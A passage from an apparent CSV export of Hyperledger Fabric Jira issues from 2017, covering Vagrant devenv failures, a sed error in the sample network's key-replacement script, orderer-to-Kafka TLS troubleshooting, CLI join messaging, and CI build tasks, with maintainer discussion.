there's a chicken and egg problem here. The ledger is needed for the channel env to be brought up (some of which is needed for receiving the channel delivery to complete the join). One thing we should do is to make sure the ledger is cleaned up if the join fails. Propose we do it as a separate JIRA item and not link it to this one.

(Anything to add [~C0rWin] ?)

What do you think [~yuki-kon] ? Does that sound reasonable ?

If the above two are agreed to, the only thing we need to do for this JIRA is the task *correct misleading CLI output on join* task.;;;","02/Nov/17 5:18 AM;yuki-kon;Thank you for thinking of this JIRA, [~muralisr]. I agree with your proposal. It's reasonable to correct misleading CLI output on join.;;;","02/Nov/17 5:59 AM;muralisr;Thank you for the prompt response [~yuki-kon]. I'll unlink *Peer should check whether belongs to a channel before creating ledger* from this JIRA and mark *post join processing to reflect accurate status of the join command* as ""won't do"";;;",,,,,,,,,,,,,,,,,,,,,
Vagrant up failed in windows system,FAB-5219,19092,,Bug,Closed,FAB,Fabric,software,denyeart,,,Low,Invalid,matador.hong,matador.hong,matador.hong,08/Jul/17 10:37 PM,20/Jul/18 11:17 PM,28/Oct/23 3:00 AM,20/Jul/18 11:05 PM,,,,Not a Bug,,fabric-build,,,,,08/Jul/17 12:00 AM,0,vagrant,,,,,,"On Window system, 
Use Vagrant to set up VM.
Steps:
1 cd $GOPATH/src/github.com/hyperledger/fabric/devenv  
2 vagrant up
 
In some Windows system, which the memory less than 4 GB, and cores less than 2. The 'vagrant up' will fail.
 
I think it should be important for this sense to successful setting up.","WIndows 7 32 bit

Memory 4GB

 ",ChristopherFerris,matador.hong,sanchezl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy7in:",,,,,,,,,,,,,,,,,,,,,,,ChristopherFerris,matador.hong,sanchezl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"26/Jan/18 6:28 AM;sanchezl;You can edit the Vagrantfile for your particular system, but 4096 was determined to be the minimum needed for the devenv.;;;","06/Apr/18 2:21 AM;ChristopherFerris;closing this since there does need to be a minimum. Note that you can develop natively on Windows without Vagrant.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Multiple private keys values are input to sed in replacePrivateKey () ,FAB-5221,19094,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,mastersingh24,RichardHill,RichardHill,10/Jul/17 6:45 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,06/Nov/17 7:18 PM,v1.0.0,v1.1.0-preview,,v1.0.5,v1.1.0,fabric-samples,,,,,,0,,,,,,,"While following the instructions here  [https://hyperledger-fabric.readthedocs.io/en/latest/build_network.html]

I saw a warning about sed...

./byfn.sh -m generate
Generating certs and genesis block for with channel 'mychannel' and CLI timeout of '10000'
Continue (y/n)? y
proceeding ...
/home/rhill/fabric-samples/first-network/../bin/cryptogen

##########################################################
##### Generate certificates using cryptogen tool #########
##########################################################
org1.example.com
org2.example.com

sed: -e expression #1, char 85: unterminated `s' command
sed: -e expression #1, char 85: unterminated `s' command

 

My setup is

docker version
Client:
 Version:      17.06.0-ce
 API version:  1.30
 Go version:   go1.8.3
 Git commit:   02c1d87
 Built:        Fri Jun 23 21:23:31 2017
 OS/Arch:      linux/amd64

Server:
 Version:      17.06.0-ce
 API version:  1.30 (minimum version 1.12)
 Go version:   go1.8.3
 Git commit:   02c1d87
 Built:        Fri Jun 23 21:19:04 2017
 OS/Arch:      linux/amd64
 Experimental: false

 

docker-compose --version
docker-compose version 1.11.2, build dfed245

 

Last commit was  $git log
commit 6899719cbbd4900970469d46e8bbf56f3346333d

 

I had a look at what sed is trying process,set -x in the 

function replacePrivateKey ()

theres mulitple private keys and linebreaks in the PRIVATE_KEY value. This looks a bit strange  but I not familiar enough with the code to know if PRIVATE_KEY should be a single value.

If its not acceptable I'll investigate the cause of those multiple keys being there and add some error handling to that bash function..

 sed -i 's/CA1_PRIVATE_KEY/1b375969c192a5167149c2917fe41df27ea42cc8ada27253717d0f486a836963_sk
7db4fd6c6a3adeaed98da8874b924deb7a56a9f88de9abd1032e98fc22cf140d_sk
8bb04d63e7b8828aeca439bed8d039762ffa28e0f72afbb7436b66bfe5c90e37_sk
f996d2eaf44211603df0c167043a75a2ccd25f901d5514597c428622e2ee1eed_sk
febd79d647b75c8b00e4ee0e9a8e0cc59ce476c0774b37157ca009809c91bf4d_sk/g' docker-compose-e2e.yaml

 ",,mastersingh24,RichardHill,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy7j3:",,,,,,,,,,,,,,,,,,,,,,,mastersingh24,RichardHill,,,,,,,,,,,,,,,,,,,,,,,,,,,,,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/protobufjs-6.11.4,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/tough-cookie-4.1.3,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/semver-6.3.1,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/grpc/grpc-js-1.8.17,dependabot/go_modules/high-throughput/application-go/google.golang.org/grpc-1.53.0,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/word-wrap-1.2.4,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/protobufjs-and-fabric-network-7.2.4,dependabot/go_modules/asset-transfer-basic/application-go/google.golang.org/grpc-1.53.0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"05/Nov/17 9:56 PM;mastersingh24;The easiest thing to do is to delete the crypto-config directory if it exists when calling generateCerts;;;","05/Nov/17 10:07 PM;mastersingh24;[https://gerrit.hyperledger.org/r/15209] (master)

https://gerrit.hyperledger.org/r/15211 (release);;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
correct misleading CLI output on join,FAB-5222,19095,19091,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,aambati,muralisr,muralisr,10/Jul/17 9:43 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,04/Nov/17 7:12 AM,,,,,,fabric-peer,,,,,,0,,,,,,," 
{code:java}
peer channel join ...
{code}
 

The peer only sets up the environment so it can complete join the successfully if permitted. The CLI response message should have been something like ""Peer has initiated join"" instead of ""Peer joined the channel!"".",,aambati,muralisr,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy7jb:",,,,,,,,,,,,,,,,,,,,,,,aambati,muralisr,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"02/Nov/17 11:37 PM;aambati;https://gerrit.hyperledger.org/r/c/15123/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
post join processing to reflect accurate status of the join command,FAB-5223,19096,19091,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,muralisr,muralisr,10/Jul/17 9:52 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,02/Nov/17 6:01 AM,,,,WON'T FIX,,fabric-peer,,,,,,0,,,,,,,"After peer receives ""join"" request, it sets up the environment for join and waits for successful delivery registration with orderer to complete the join. It should maintain some kind of status information so tools such as ""peer channel list ... "" (and the underlying CSCC system chaincode) can return more accurate state of channel.",,muralisr,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy7jj:",,,,,,,,,,,,,,,,,,,,,,,muralisr,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"02/Nov/17 6:01 AM;muralisr;Per discussion in https://jira.hyperledger.org/browse/FAB-5218, marking this as WONT FIX;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
`vagrant up` fails behind proxy,FAB-5224,19098,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,ynamiki,ynamiki,ynamiki,10/Jul/17 4:11 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,01/Dec/17 4:53 PM,v1.0.0-rc1,,,WON'T FIX,,fabric-build,,,,,,0,,,,,,,"As of revision 4709b33 (2017-07-07), {{vagrant up}} for [building a developer environment|http://hyperledger-fabric.readthedocs.io/en/latest/dev-setup/devenv.html#bootstrapping-the-vm-using-vagrant] fails behind a proxy:

{code}
$ vagrant up
...
==> default: + apt-key adv --keyserver hkp://p80.pool.sks-keyservers.net:80 --recv-keys 58118E89F3A912897C070ADBF76221572C52609D
==> default: Executing: /tmp/tmp.ry9ie0CsUG/gpg.1.sh --keyserver
==> default: hkp://p80.pool.sks-keyservers.net:80
==> default: --recv-keys
==> default: 58118E89F3A912897C070ADBF76221572C52609D
==> default: gpg:
==> default: requesting key 2C52609D from hkp server p80.pool.sks-keyservers.net
==> default: gpgkeys: key 58118E89F3A912897C070ADBF76221572C52609D not found on keyserver
==> default: gpg:
==> default: no valid OpenPGP data found.
==> default: gpg:
==> default: Total number processed: 0
==> default: gpg:
==> default: keyserver communications error: key not found
==> default: gpg:
==> default: keyserver communications error: bad public key
==> default: gpg:
==> default: keyserver receive failed: bad public key
The SSH command responded with a non-zero exit status. Vagrant
assumes that this means the command failed. The output for this command
should be in the log above. Please read the output to determine what
went wrong.
{code}

",,denyeart,ynamiki,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy7jr:",,,,,,,,,,,,,,,,,,,,,,,denyeart,ynamiki,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"24/Jul/17 8:38 PM;ynamiki;https://gerrit.hyperledger.org/r/11463;;;","01/Sep/17 10:35 PM;ynamiki;Tried with the latest revision, got a different error.
It seems that a docker daemon does not see a proxy configuration.

Environment:
* Fabric: b653f38 (2017-08-30)
* vagrant-proxyconf: 1.5.2
* Vagrant: 1.9.8
* VirtualBox: 5.0.40_Ubuntu (installed by apt)
* Ubuntu: 16.04.1

{code}
$ export http_proxy=<proxy>
$ export https_proxy=<proxy>
$ export VAGRANT_HTTP_PROXY=<proxy>
$ export VAGRANT_HTTPS_PROXY=<proxy>
$ vagrant up
...
==> default: + docker run --rm busybox echo All good
==> default: Unable to find image 'busybox:latest' locally
==> default: docker: Error response from daemon: Get https://registry-1.docker.io/v2/: net/http: request canceled while waiting for connection (Client.Timeout exceeded while awaiting headers).
==> default: See 'docker run --help'.
The SSH command responded with a non-zero exit status. Vagrant
assumes that this means the command failed. The output for this command
should be in the log above. Please read the output to determine what
went wrong.
{code}
 ;;;","27/Nov/17 12:46 PM;denyeart;[~ynamiki] Can you provide an update?;;;","01/Dec/17 5:13 PM;ynamiki;This could be my environment issue.

I want to set the status to ""Won't Fix"" but I cannot find such workflow.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Expose leadership and membeship information,FAB-5225,19100,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Duplicate,gennadyl,gennadyl,gennadyl,10/Jul/17 4:31 PM,13/Sep/18 10:50 PM,28/Oct/23 3:00 AM,13/Sep/18 10:50 PM,,,,,,fabric-gossip,,,,,,6,active,gossip,Release-planning-1.2,,,,The idea is to expose channel leader in org and channel members using system chain code to outside world. This item suggest to add an API into QSCC in order to enable queries to see who are participants/members in specific channel and also whenever given peer is the leader of the channel within its organization.,,bstasyszyn,C0rWin,ChristopherFerris,gennadyl,JonathanLevi,muralisr,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,FAB-290,,,,,,,,,"1|hzy7k7:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,bstasyszyn,C0rWin,ChristopherFerris,gennadyl,JonathanLevi,muralisr,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"08/Aug/17 12:11 AM;C0rWin;https://gerrit.hyperledger.org/r/#/c/11537/;;;","08/Aug/17 1:43 AM;JonathanLevi;A related discussion is taking place here: https://chat.hyperledger.org/channel/fabric-maintainers?msg=nzaT4gXvBFvHoF2Py;;;","10/Aug/17 8:57 PM;gennadyl;[~C0rWin] [~JonathanLevi] I saw your discussion in rocket - any conclusions?;;;","10/Aug/17 9:27 PM;bstasyszyn;How does this issue relate to FAB-5451? It seems that both are trying to solve the same problem.;;;","14/Aug/17 9:16 PM;muralisr;[~bstasyszyn] seems FAB-5451 is a bigger story of which this JIRA could be viewed as a logical part. [~C0rWin] , can you comment please ? 

In any case does seem to fill a need.;;;","14/Aug/17 9:18 PM;C0rWin;[~bstasyszyn] this task serves as a preliminary work in terms of defining API's and interactions for service discovery. ;;;","14/Aug/17 9:24 PM;bstasyszyn;[~C0rWin] [~muralisr] OK thanks. I was just looking at the patch set https://gerrit.hyperledger.org/r/#/c/11537/ and noticed that MSP ID of each peer is not included in gossip_info. This is something we require and was supposed to be part of FAB-5451.;;;","14/Aug/17 9:54 PM;C0rWin;In order to invoke any of SCC you need you MSP to be configured, in particular you should know your MSP ID, hence not sure why you need this data to be part of gossip_info.;;;","14/Aug/17 10:03 PM;bstasyszyn;If I have peers from multiple orgs (MSPs) joined to a channel and I have a CC policy that requires endorsements from multiple orgs then I'd like to know to which peers to send the proposal in order to satisfy the policy. For scalability reasons I don't want to send the proposal to all of the peers all of the time - just a minimal set that will satisfy the policy.;;;","14/Aug/17 10:21 PM;C0rWin;While it make sense for Service Discovery, I do not see how this could be applicable here. 

> For scalability reasons I don't want to send the proposal to all of the peers all of the time - just a minimal set that will satisfy the policy.

With current item you still will have to do it.;;;","14/Aug/17 10:24 PM;bstasyszyn;I'm probably misunderstanding the intent/scope of this feature. Yes, I'm talking about service discovery.;;;","17/Aug/17 3:15 AM;ChristopherFerris;This has met the 5 maintainer threshold.;;;","13/Sep/18 10:50 PM;gennadyl;Was fixed as part discovery service;;;",,,,,,,,,,,,,,,,,,,,,,,,,,
orderer can not connect kafka if TLS is enabled,FAB-5226,19103,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,sanchezl,hongquan.zhang,hongquan.zhang,10/Jul/17 7:37 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,11/Jul/17 5:04 PM,,,,,,fabric-orderer,,,,,,0,orderer,tls,,,,,"At first, there's a minor bug in fabric/orderer/kafka/config.go, function newBrokerConfig.
{code:java}
for _, certificate := range tlsConfig.RootCAs {
    if !rootCAs.AppendCertsFromPEM([]byte(certificate)) {
                logger.Panic(fmt.Sprintf(""Unable to parse the root certificate authority certificates (Kafka.Tls.RootCAs)""))
   }

{code}
rootCAs.AppendCertsFromPEM accpet ca file content, not the file name.

After correcting this by read ca file content into a byte slice and pass the byte slice into AppendCertsFromPEM. orderer can load RooCAs correctly.

But then orderer can not complete tls handshake with kafka.

The error message from orderer is:
{code:java}
Failed to connect to broker kafka1:9093: tls: first record does not look like a TLS handshake{code}
I use openssl s_client -debug -connect kafka1:9093 to verify the tls setting on kafka1 and find it's OK.","ubuntu 14.04 

docker 17.05-ce

 ",hongquan.zhang,kchristidis,sanchezl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"11/Jul/17 2:19 PM;sanchezl;fab-5226.zip;https://jira.hyperledger.org/secure/attachment/11628/fab-5226.zip",,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy7kn:",,,,,,,,,,,,,,,,,,,,,,,hongquan.zhang,kchristidis,sanchezl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"10/Jul/17 8:53 PM;kchristidis;Regarding the code, this is not a bug. The config file clearly states that that PrivateKey, Certificate, RootCAs, are supposed to hold the key *values*. If you wish to point to the file, just uncomment the File line and edit the path. See [https://github.com/hyperledger/fabric/blob/master/sampleconfig/orderer.yaml#L201...L223] for more.

We'll be looking into the TLS handshake issue.;;;","11/Jul/17 12:50 AM;sanchezl;[~hongquan.zhang] please confirm that the issue is still occurring by either:


 * inserting the text of the encoded certificate into the configuration yaml, or
 * specifying the file path to the encoded certificated in the configuration yaml, as per the previous comment.

 ;;;","11/Jul/17 10:53 AM;hongquan.zhang;Hi [~sanchezl], the problem is still there after using the configuration method mentioned above.
{code:java}
Failed to connect to broker kafka0:9093: tls: first record does not look like a TLS handshake
{code}
I used tcpdump to capture tcp stream data between orderer and kafka, and found that kafka always return bunch of 0x00 byte instead of ServerHello message after receiving ClientHello from orderer.

It seems that kafka and orderer can't make a deal with the cipher method they want to use;;;","11/Jul/17 2:24 PM;sanchezl;[~hongquan.zhang], the orderer to kafka TLS functionality appears to be working ok for me. I have attached a small docker-compose environment to this issue so you can try it yourself, and maybe compare to your own configuration:
 # Extract  [^fab-5226.zip]
 # {{cd fab-5226}}
 # Run {{./script.sh}} to generate sample crypto materials.
 # Run {{docker-compose up -d}} to start the environment.
 # View logs via {{docker-compose logs}} (see command help for details)

 ;;;","11/Jul/17 5:04 PM;hongquan.zhang;Hi [~sanchezl], scripts you provided work very well. 

So there should be some error in my configuration or keystore configuration. I'll check that.

Thank you very much, and very sorry for any inconvenience。;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
update curl command in bootstrap script (bootstrap-1.0.0.sh),FAB-5230,19112,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,rameshthoomu,rameshthoomu,rameshthoomu,10/Jul/17 10:50 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,11/Jul/17 9:04 PM,v1.0.0-rc1,,,v1.0.0,,fabric-build,,,,,,0,build-system,,,,,,"Update curl command in ([https://github.com/hyperledger/fabric/blob/master/scripts/bootstrap-1.0.0.sh#L35]) also add ""tools"" image name to the list of docker images.",,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy7lr:",,,,,,,,,,,,,,,,,,,,,,,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"11/Jul/17 9:04 PM;rameshthoomu;Patch has been merged. Closing this task;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Add bootstrap-1.0.0-rc2 script,FAB-5234,19121,,Task,Closed,FAB,Fabric,software,denyeart,,,Lowest,Done,,rameshthoomu,rameshthoomu,11/Jul/17 1:29 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,11/Jul/17 9:04 PM,v1.0.0-rc1,,,v1.0.0,,fabric-build,,,,,,0,build-system,,,,,,Add bootstrap-1.0.0-rc2.sh script to support byfn tests.,,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy7pr:",,,,,,,,,,,,,,,,,,,,,,,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"11/Jul/17 9:04 PM;rameshthoomu;patch has been abandoned.Closing this task;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Add orderer performance tests,FAB-5236,19124,,Story,Closed,FAB,Fabric,software,denyeart,,,High,Done,guoger,jyellick,jyellick,11/Jul/17 2:02 AM,21/Jul/18 3:56 AM,28/Oct/23 3:00 AM,26/Jul/17 11:26 PM,v1.0.0,,,v1.1.0,,fabric-orderer,,,,,,0,performance,Release-planning-1.1,,,,,"Today, all of our performance testing for the orderer is being done by spinning up an orderer process, bound to a port, then having external clients direct traffic to the ordering service.

This has been fine to get an overall impression of performance with the ordering code, but it's very time consuming and difficult to gauge the effect of performance improvements and to catch performance regressions.

Completion of this story should require the following:
 # Refactor {{main.go}} so that the server can be started without binding to a real address, and instead supply a mock structure to register the gRPC services with.
 # Create mock {{Broadcast}} clients which will submit properly signed messages via the {{Broadcast}} API. The number of clients should be arbitrary, and the message sizes should also be configurable, as should the desired channel.
 # Create mock {{Deliver}} clients which operate similarly to the {{Broadcast}} ones.
 # Create performance tests that leverage 1-3 to cover a variety of scenarios. Some which immediately come to mind:
 ** 1 Broadcast and 1 Deliver, each going as fast as possible on a single channel
 ** many Broadcast and 1 Deliver on a single channel
 ** many Broadcast and many Deliver on a single channel
 ** 1 Broadcast and 1 Deliver for each of many channels
 ** many Broadcast and many Deliver for each of many channels
 ** (a)-(e) each with small, medium, and large messages",,jyellick,kchristidis,vukolic,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzy7q7:",,,,Unset,,,,,,,8.0,Unset,,,,,,,,,,,jyellick,kchristidis,vukolic,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
`vagrant up` fails in installing cryptography by pip,FAB-5240,19129,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,ynamiki,ynamiki,ynamiki,11/Jul/17 9:25 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,09/Sep/17 8:41 PM,v1.0.0,,,,,fabric-build,,,,,,0,,,,,,,"As of revision 4709b33 (2017-07-07), {{vagrant up}} for [building a developer environment|http://hyperledger-fabric.readthedocs.io/en/latest/dev-setup/devenv.html#bootstrapping-the-vm-using-vagrant] fails in installing cryptography by pip:

{code}
$ vagrant up
...
==> default:   Running setup.py bdist_wheel for cryptography: started
==> default:   Running setup.py bdist_wheel for cryptography: finished with status 'error'
==> default:   Complete output from command /usr/bin/python -u -c ""import setuptools, tokenize;__file__='/tmp/pip-build-An4Hie/cryptography/setup.py';f=getattr(tokenize, 'open', open)(__file__);code=f.read().replace('\r\n', '\n');f.close
();exec(compile(code, __file__, 'exec'))"" bdist_wheel -d /tmp/tmpKNBjImpip-wheel- --python-tag cp27:
==> default:   c/_cffi_backend.c:15:17: fatal error: ffi.h: No such file or directory
==> default:   compilation terminated.
==> default:   Traceback (most recent call last):
==> default:     File ""<string>"", line 1, in <module>
==> default:     File ""/tmp/pip-build-An4Hie/cryptography/setup.py"", line 321, in <module>
==> default:       **keywords_with_side_effects(sys.argv)
==> default:     File ""/usr/lib/python2.7/distutils/core.py"", line 111, in setup
==> default:       _setup_distribution = dist = klass(attrs)
==> default:     File ""/usr/lib/python2.7/dist-packages/setuptools/dist.py"", line 269, in __init__
==> default:       self.fetch_build_eggs(attrs['setup_requires'])
==> default:     File ""/usr/lib/python2.7/dist-packages/setuptools/dist.py"", line 313, in fetch_build_eggs
==> default:       replace_conflicting=True,
==> default:     File ""/usr/lib/python2.7/dist-packages/pkg_resources/__init__.py"", line 826, in resolve
==> default:       dist = best[req.key] = env.best_match(req, ws, installer)
==> default:     File ""/usr/lib/python2.7/dist-packages/pkg_resources/__init__.py"", line 1092, in best_match
==> default:       return self.obtain(req, installer)
==> default:     File ""/usr/lib/python2.7/dist-packages/pkg_resources/__init__.py"", line 1104, in obtain
==> default:       return installer(requirement)
==> default:     File ""/usr/lib/python2.7/dist-packages/setuptools/dist.py"", line 380, in fetch_build_egg
==> default:       return cmd.easy_install(req)
==> default:     File ""/usr/lib/python2.7/dist-packages/setuptools/command/easy_install.py"", line 663, in easy_install
==> default:       return self.install_item(spec, dist.location, tmpdir, deps)
==> default:     File ""/usr/lib/python2.7/dist-packages/setuptools/command/easy_install.py"", line 693, in install_item
==> default:       dists = self.install_eggs(spec, download, tmpdir)
==> default:     File ""/usr/lib/python2.7/dist-packages/setuptools/command/easy_install.py"", line 873, in install_eggs
==> default:       return self.build_and_install(setup_script, setup_base)
==> default:     File ""/usr/lib/python2.7/dist-packages/setuptools/command/easy_install.py"", line 1101, in build_and_install
==> default:       self.run_setup(setup_script, setup_base, args)
==> default:     File ""/usr/lib/python2.7/dist-packages/setuptools/command/easy_install.py"", line 1089, in run_setup
==> default:       raise DistutilsError(""Setup script exited with %s"" % (v.args[0],))
==> default:   distutils.errors.DistutilsError: Setup script exited with error: command 'x86_64-linux-gnu-gcc' failed with exit status 1
==> default:
==> default:   ----------------------------------------
==> default:   Failed building wheel for cryptography
{code}",,ynamiki,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy7qv:",,,,,,,,,,,,,,,,,,,,,,,ynamiki,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"24/Jul/17 8:38 PM;ynamiki;https://gerrit.hyperledger.org/r/11489;;;","09/Sep/17 8:41 PM;ynamiki;The patch has been merged, thanks.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Install facter and xmlstarlet in CI build power nodes,FAB-5241,19130,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,harsha544,rameshthoomu,rameshthoomu,11/Jul/17 12:06 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,11/Jul/17 10:35 PM,v1.0.0-rc1,,,v1.0.0,,fabric-build,,,,,,0,build-system,,,,,,"Install ""facter"" and ""xmlstarlet"" python modules in CI build power nodes including sandbox.",Jenkins Power build nodes,bsmita,harsha544,rameshthoomu,SriramaSharma,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy7r3:",,,,,,,,,,,,,,,,,,,,,,,bsmita,harsha544,rameshthoomu,SriramaSharma,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"11/Jul/17 10:35 PM;harsha544;Installed the mentioned packages :- 

root@blockchain-1:~# dpkg -l | egrep -i 'facter|xmlstarlet|sysstat'
ii  facter                                2.4.6-1                                    all          collect and display facts about the system
ii  sysstat                               11.2.0-1ubuntu0.1                          ppc64el      system performance tools for Linux
ii  xmlstarlet                            1.6.1-1ubuntu1                             ppc64el      command line XML toolkit
root@blockchain-1:~# ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Create Release tests job in CI,FAB-5244,19153,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,rameshthoomu,rameshthoomu,rameshthoomu,11/Jul/17 9:10 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,14/Jul/17 12:03 AM,,,,,,fabric-build,,,,,,0,,,,,,,Create Release test job in CI to tests release test suite.,,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy7tr:",,,,,,,,,,,,,,,,,,,,,,,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"14/Jul/17 12:03 AM;rameshthoomu;Patch has been submitted and merged. We run this job for every release.. See the result of 1.0.0 release https://jenkins.hyperledger.org/view/release/job/fabric-release-tests-x86_64/test_results_analyzer/

 ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
